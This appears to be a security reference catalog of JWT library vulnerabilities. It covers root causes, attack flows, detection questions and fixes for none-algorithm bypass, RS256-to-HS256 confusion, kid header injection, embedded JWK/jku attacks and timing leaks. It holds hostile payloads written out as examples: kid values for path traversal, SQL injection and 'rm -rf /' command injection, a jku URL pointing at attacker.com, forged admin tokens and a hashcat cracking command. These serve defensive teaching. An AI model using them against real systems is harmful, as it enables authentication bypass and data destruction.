# JWT Library Vulnerability Catalog

## CVE-2026-23993: HarbourJwt Unknown Algorithm Bypass

**Root Cause**: `GetSignature()` returns empty string for unknown algorithms instead of throwing.

**Attack Flow**:
1. Attacker crafts token with `alg: "FAKE"`
2. Library calls `GetSignature("FAKE")` → returns `""`
3. Token has empty signature field
4. Verification: `"" == ""` → passes

**Vulnerable Pattern**:
```csharp
public string GetSignature(string algorithm) {
    switch(algorithm) {
        case "HS256": return ComputeHmac256(...);
        case "RS256": return ComputeRsa256(...);
        default: return "";  // BUG: Should throw
    }
}
```

**Fix Requirements**:
1. Unknown algorithm must throw/return error
2. Verification must check for error state
3. Empty signature must always fail

---

## None Algorithm Bypass

**Root Cause**: Library accepts `alg: "none"` as valid, skipping signature verification.

**Variants**:
- `"none"`, `"None"`, `"NONE"`, `"nOnE"` (case variations)
- `"none "` (trailing whitespace)
- Empty string `""`

**Attack**:
```
Header: {"alg": "none", "typ": "JWT"}
Payload: {"sub": "admin", "role": "superuser"}
Signature: (empty)
```

**Detection Questions**:
- Is "none" explicitly checked and rejected?
- Is the check case-insensitive?
- What happens with empty `alg` value?

---

## Algorithm Confusion (RS256 → HS256)

**Root Cause**: Library uses `alg` header to select verification method; attacker switches from asymmetric to symmetric.

**Attack Flow**:
1. Server uses RS256 with public key `PUB` and private key `PRIV`
2. Attacker obtains `PUB` (often publicly available)
3. Attacker creates token with `alg: "HS256"`
4. Attacker signs with `HMAC(PUB, payload)`
5. Library sees HS256, uses provided key as HMAC secret
6. If same key object is passed, `HMAC(PUB, payload)` matches

**Vulnerable Pattern**:
```python
def verify(token, key):
    alg = decode_header(token)["alg"]
    if alg == "HS256":
        return hmac_verify(token, key)  # key used as HMAC secret
    elif alg == "RS256":
        return rsa_verify(token, key)   # key used as RSA public
```

**Fix**: Enforce key type matches algorithm:
```python
def verify(token, key, allowed_algorithms):
    alg = decode_header(token)["alg"]
    if alg not in allowed_algorithms:
        raise ValueError("Algorithm not allowed")
    if alg.startswith("HS") and not isinstance(key, bytes):
        raise TypeError("HMAC requires symmetric key")
    if alg.startswith("RS") and not isinstance(key, RSAPublicKey):
        raise TypeError("RSA requires RSA key")
```

---

## Kid Header Injection

**Root Cause**: `kid` (Key ID) header used unsanitized in file path or database query.

**Path Traversal**:
```json
{"alg": "HS256", "kid": "../../../etc/passwd"}
```
Server reads `/etc/passwd` as signing key.

**SQL Injection**:
```json
{"alg": "HS256", "kid": "key1' OR '1'='1"}
```
Returns first key in database.

**Command Injection**:
```json
{"alg": "HS256", "kid": "key1; rm -rf /"}
```
If kid passed to shell command.

**Detection**: Search for `kid` usage in:
- File path construction
- SQL queries
- Shell commands
- LDAP queries

---

## Embedded JWK Attacks

**Root Cause**: Library trusts signing key embedded in token itself.

**Headers exploited**:
- `jwk`: Embedded JSON Web Key
- `jku`: URL to fetch JWK Set
- `x5u`: URL to fetch X.509 certificate
- `x5c`: Embedded X.509 certificate chain

**Attack (jwk)**:
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's public key>",
    "e": "AQAB"
  }
}
```
Attacker signs with their private key; library verifies with embedded public key.

**Attack (jku/x5u)**:
```json
{
  "alg": "RS256",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```
Library fetches attacker's key set.

**Fix**: Never trust keys from token. Use server-configured keys only.

---

## Signature Not Verified

**Root Cause**: Library provides `decode()` function that parses without verification; developers use it incorrectly.

**Dangerous API**:
```python
# Library provides both:
decode(token)         # Parses only, no verification
verify(token, key)    # Parses and verifies

# Developer uses wrong one:
claims = jwt.decode(token)  # No signature check!
```

**Detection**: Look for:
- Public `decode` function without key parameter
- `verify` parameter defaulting to `False`
- `options={"verify_signature": False}` patterns

---

## Weak HMAC Secrets

**Root Cause**: Library doesn't enforce secret strength; weak secrets are brute-forceable.

**Attack**: Tools like `hashcat` can crack weak HS256 secrets:
```bash
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

**Detection Questions**:
- Does library warn on short secrets?
- Is there minimum length enforcement?
- Are common/hardcoded secrets detected?

**Note**: This is often consumer misuse, but libraries should provide guardrails.

---

## Timing Attacks on Signature Comparison

**Root Cause**: Non-constant-time string comparison leaks signature bytes.

**Vulnerable**:
```python
if computed_signature == provided_signature:
    return True
```
Comparison short-circuits on first mismatch; timing reveals correct bytes.

**Secure**:
```python
import hmac
if hmac.compare_digest(computed_signature, provided_signature):
    return True
```

---

## References

- [CVE-2026-23993 Analysis](https://pentesterlab.com/blog/cve-2026-23993-harbourjwt-unknown-alg-jwt-bypass)
- [Auth0 JWT Vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [RFC 8725 JWT BCP](https://www.rfc-editor.org/rfc/rfc8725.html)
- [PortSwigger JWT Attacks](https://portswigger.net/web-security/jwt)
